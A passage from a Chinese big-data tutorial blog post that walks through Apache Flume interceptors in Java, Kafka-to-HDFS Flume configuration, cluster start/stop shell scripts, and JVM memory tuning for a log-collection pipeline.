class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）在com.molly.flume.interceptor包下创建LogInterceptor类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ETLInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String log <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>JSONUtils<span class="token punctuation">.</span><span class="token function">isJSONValidate</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> event<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Iterator<span class="token operator">&lt;</span>Event<span class="token operator">></span> iterator <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            Event next <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intercept</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token operator">==</span>null<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                iterator<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> list<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Builder</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor<span class="token punctuation">.</span>Builder</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ETLInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>       <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6）打包</p><p>​      <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637725114820.png" alt="1637725114820"></p><p>7）需要先将打好的包放入到hadoop102的/opt/module/flume/lib文件夹下面。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 lib<span class="token punctuation">]</span>$ <span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> interceptorflume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>8）分发Flume到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync flume/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>9）hadoop102消费Flume数据</strong></p><p>为了查看第一次flume是否起作用，我们开启一个kafka消费端来消费kafkaChannel中的数据。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102~<span class="token punctuation">]</span>kafka-console-consumer.sh --topic topic_log --bootstrap-server hadoop102:9092<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10）分别在hadoop102、hadoop103上启动Flume</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --name a1 --conf-file conf/file-flume-kafka.conf <span class="token operator">&amp;</span><span class="token punctuation">[</span>molly@hadoop103 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --name a1 --conf-file conf/file-flume-kafka.conf <span class="token operator">&amp;</span><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --name a1 --conf-file conf/file-flume-kafka.conf  -n a1 -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>11）观看9)中的kafka消费端有数据在消费。</p><h3 id="5-1-4-日志采集Flume启动停止脚本"><a href="#5-1-4-日志采集Flume启动停止脚本" class="headerlink" title="5.1.4 日志采集Flume启动停止脚本"></a>5.1.4 日志采集Flume启动停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本f1.sh</p><p>[molly@hadoop102 bin]$ vim f1.sh</p><p>​    在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashcase $1 in"start")&#123;        for i in hadoop102 hadoop103        do                echo " --------启动 $i 采集flume-------"                ssh $i "nohup /opt/module/flume/bin/flume-ng agent --conf-file /opt/module/flume/conf/file-flume-kafka.conf --name a1 -Dflume.root.logger=INFO,LOGFILE >/opt/module/flume/log1.txt 2>&1  &"        done&#125;;;    "stop")&#123;        for i in hadoop102 hadoop103        do                echo " --------停止 $i 采集flume-------"                ssh $i "ps -ef | grep file-flume-kafka | grep -v grep |awk  '&#123;print \$2&#125;' | xargs -n1 kill -9 "        done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明1：nohup，该命令可以在你退出帐户/关闭终端之后继续运行相应的进程。nohup就是不挂起的意思，不挂断地运行命令。</p><p>说明2：awk 默认分隔符为空格</p><p>说明3：xargs 表示取出前面命令运行的结果，作为后面命令的输入参数。</p><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x f1.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）f1集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f1.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）f1集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f1.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>集群规划</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Flume（消费Kafka）</td><td></td><td></td><td>Flume</td></tr></tbody></table><h2 id="5-2-第二层flume采集"><a href="#5-2-第二层flume采集" class="headerlink" title="5.2 第二层flume采集"></a>5.2 第二层flume采集</h2><p>集群规划，第二层flume是消费Kafka数据的Flume，部署在hadoop104上。</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Flume（消费Kafka）</td><td></td><td></td><td>Flume</td></tr></tbody></table><h3 id="5-2-1-项目经验之Flume组件选型"><a href="#5-2-1-项目经验之Flume组件选型" class="headerlink" title="5.2.1 项目经验之Flume组件选型"></a>5.2.1 项目经验之Flume组件选型</h3><p>第二次Flume主要作用是消费Kafka中的数据，然后存储到HDFS中，因此Source选择KafkaSource,sink选择HDFSsink。同时在source端使用一个拦截器：拦截器作用是获取日志中的实际时间。</p><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637738855416.png" alt="1637738855416"></p><p>1）FileChannel和MemoryChannel区别</p><p>MemoryChannel传输数据速度更快，但因为数据保存在JVM的堆内存中，Agent进程挂掉会导致数据丢失，适用于对数据质量要求不高的需求。</p><p>FileChannel传输速度相对于Memory慢，但数据安全保障高，Agent进程挂掉也可以从失败中恢复数据。</p><p>选型：</p><p>金融类公司、对钱要求非常准确的公司通常会选择FileChannel</p><p>传输的是普通日志信息（京东内部一天丢100万-200万条，这是非常正常的），通常选择MemoryChannel。</p><p><strong>2）FileChannel优化</strong></p><p>通过配置dataDirs指向多个路径，每个路径对应不同的硬盘，增大Flume吞吐量。</p><p>官方说明如下：</p><p>checkpointDir和backupCheckpointDir也尽量配置在不同硬盘对应的目录中，保证checkpoint坏掉后，可以快速使用backupCheckpointDir恢复数据</p><p><strong>3）Sink：HDFS Sink</strong></p><p>（1）HDFS存入大量小文件，有什么影响？</p><p><strong>元数据层面：</strong>每个小文件都有一份元数据，其中包括文件路径，文件名，所有者，所属组，权限，创建时间等，这些信息都保存在Namenode内存中。所以小文件过多，会占用Namenode服务器大量内存，影响Namenode性能和使用寿命</p><p><strong>计算层面：</strong>默认情况下MR会对每个小文件启用一个Map任务计算，非常影响计算性能。同时也影响磁盘寻址时间。</p><p>（2）HDFS小文件处理</p><p>官方默认的这三个参数配置写入HDFS后会产生小文件，hdfs.rollInterval、hdfs.rollSize、hdfs.rollCount</p><p>基于以上hdfs.rollInterval=3600，hdfs.rollSize=134217728，hdfs.rollCount =0几个参数综合作用，效果如下：</p><p>（1）文件在达到128M时会滚动生成新文件</p><p>（2）文件创建超3600秒时会滚动生成新文件</p><h3 id="5-2-2-Flume拦截器"><a href="#5-2-2-Flume拦截器" class="headerlink" title="5.2.2 Flume拦截器"></a>5.2.2 Flume拦截器</h3><p>由于flume默认会用linux系统时间，作为输出到HDFS路径的时间。如果数据是23:59分产生的。Flume消费kafka里面的数据时，有可能已经是第二天了，那么这部门数据会被发往第二天的HDFS路径。我们希望的是根据日志里面的实际时间，发往HDFS的路径，<strong>所以下面拦截器作用是获取日志中的实际时间</strong>。</p><p>1）在com.molly.flume.interceptor包下创建TimeStampInterceptor类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObject<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TimeStampInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> ArrayList<span class="token operator">&lt;</span>Event<span class="token operator">></span> events <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String log <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">;</span>        JSONObject jsonObject <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>        String ts <span class="token operator">=</span> jsonObject<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"timestamp"</span><span class="token punctuation">,</span> ts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> event<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        events<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Event event <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            events<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">intercept</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> events<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Builder</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor<span class="token punctuation">.</span>Builder</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TimeStampInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）重新打包</p><p>​                 <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637739135017.png" alt="1637739135017">                   </p><p>3）需要先将打好的包放入到hadoop102的/opt/module/flume/lib文件夹下面。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 lib<span class="token punctuation">]</span>$ <span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> interceptorflume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4）分发Flume到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync flume/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-2-3-日志消费Flume配置"><a href="#5-2-3-日志消费Flume配置" class="headerlink" title="5.2.3 日志消费Flume配置"></a>5.2.3 日志消费Flume配置</h3><p>1）Flume的具体配置如下：</p><p>​    （1）在hadoop104的/opt/module/flume/conf目录下创建kafka-flume-hdfs.conf文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop104 conf<span class="token punctuation">]</span>$ vim kafka-flume-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件配置如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">## 组件a1.sources=r1a1.channels=c1a1.sinks=k1## source1a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSourcea1.sources.r1.batchSize = 5000a1.sources.r1.batchDurationMillis = 2000a1.sources.r1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092a1.sources.r1.kafka.topics=topic_loga1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = com.molly.flume.interceptor.TimeStampInterceptor$Builder## channel1a1.channels.c1.type = filea1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior1a1.channels.c1.dataDirs = /opt/module/flume/data/behavior1/a1.channels.c1.maxFileSize = 2146435071a1.channels.c1.capacity = 1000000a1.channels.c1.keep-alive = 6## sink1a1.sinks.k1.type = hdfsa1.sinks.k1.hdfs.path = /origin_data/gmall/log/topic_log/%Y-%m-%da1.sinks.k1.hdfs.filePrefix = log-a1.sinks.k1.hdfs.round = falsea1.sinks.k1.hdfs.rollInterval = 10a1.sinks.k1.hdfs.rollSize = 134217728a1.sinks.k1.hdfs.rollCount = 0## 控制输出文件是原生文件。a1.sinks.k1.hdfs.fileType = CompressedStreama1.sinks.k1.hdfs.codeC = lzop## 拼装a1.sources.r1.channels = c1a1.sinks.k1.channel= c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-4-日志消费Flume启动停止脚本"><a href="#5-2-4-日志消费Flume启动停止脚本" class="headerlink" title="5.2.4 日志消费Flume启动停止脚本"></a>5.2.4 日志消费Flume启动停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本f2.sh</p><p>[molly@hadoop102 bin]$ vim f2.sh</p><p>​    在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashcase $1 in"start")&#123;        for i in hadoop104        do                echo " --------启动 $i 消费flume-------"                ssh $i "nohup /opt/module/flume/bin/flume-ng agent --conf-file /opt/module/flume/conf/kafka-flume-hdfs.conf --name a1 -Dflume.root.logger=INFO,LOGFILE >/opt/module/flume/log2.txt   2>&1 &"        done&#125;;;"stop")&#123;        for i in hadoop104        do                echo " --------停止 $i 消费flume-------"                ssh $i "ps -ef | grep kafka-flume-hdfs | grep -v grep |awk '&#123;print \$2&#125;' | xargs -n1 kill"        done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x f2.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）f2集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f2.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）f2集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f2.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-3-项目经验之Flume内存优化"><a href="#5-3-项目经验之Flume内存优化" class="headerlink" title="5.3 项目经验之Flume内存优化"></a>5.3 项目经验之Flume内存优化</h2><p>1）问题描述：如果启动消费Flume抛出如下异常</p><p>ERROR hdfs.HDFSEventSink: process failed</p><p>java.lang.OutOfMemoryError: GC overhead limit exceeded</p><p>2）解决方案步骤：</p><p>（1）在hadoop102服务器的/opt/module/flume/conf/flume-env.sh文件中增加如下配置</p><p>export JAVA_OPTS=”-Xms100m -Xmx2000m -Dcom.sun.management.jmxremote”</p><p>（2）同步配置到hadoop103、hadoop104服务器</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 conf<span class="token punctuation">]</span>$ xsync flume-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）Flume内存参数设置及优化</p><p>JVM heap一般设置为4G或更高</p><p>-Xmx与-Xms最好设置一致，减少内存抖动带来的性能影响，如果设置不一致容易导致频繁fullgc。</p><p>-Xms表示JVM Heap(堆内存)最小尺寸，初始分配；-Xmx 表示JVM Heap(堆内存)最大允许的尺寸，按需分配。如果不设置一致，容易在初始化时，由于内存不够，频繁触发fullgc。</p><h2 id="5-4-采集通道启动-停止脚本"><a href="#5-4-采集通道启动-停止脚本" class="headerlink" title="5.4 采集通道启动/停止脚本"></a>5.4 采集通道启动/停止脚本</h2><h3 id="5-4-1-数据通道测试"><a href="#5-4-1-数据通道测试" class="headerlink" title="5.4.1 数据通道测试"></a>5.4.1 数据通道测试</h3><p>根据需求分别生成2020-06-14和2020-06-15日期的数据</p><p>1）修改/opt/module/applog/application.yml中业务日期为2020-06-14</p><p>#业务日期</p><p>mock.date=2020-06-14</p><p>2）执行脚本，生成2020-06-14日志数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ lg.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）再次修改/opt/module/applog/application.yml中业务日期2020-06-15</p><p>#业务日期</p><p>mock.date=2020-06-15</p><p>4）执行脚本，生成2020-06-15日志数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ lg.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）在这个期间，不断观察Hadoop的HDFS路径上是否有数据</p><p>​              <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637740975327.png" alt="1637740975327">                      </p><h3 id="5-4-2-采集通道启动-停止脚本"><a href="#5-4-2-采集通道启动-停止脚本" class="headerlink" title="5.4.2 采集通道启动/停止脚本"></a>5.4.2 采集通道启动/停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本cluster.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ vim cluster.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashcase $1 in"start")&#123;        echo ================== 启动 集群 ==================        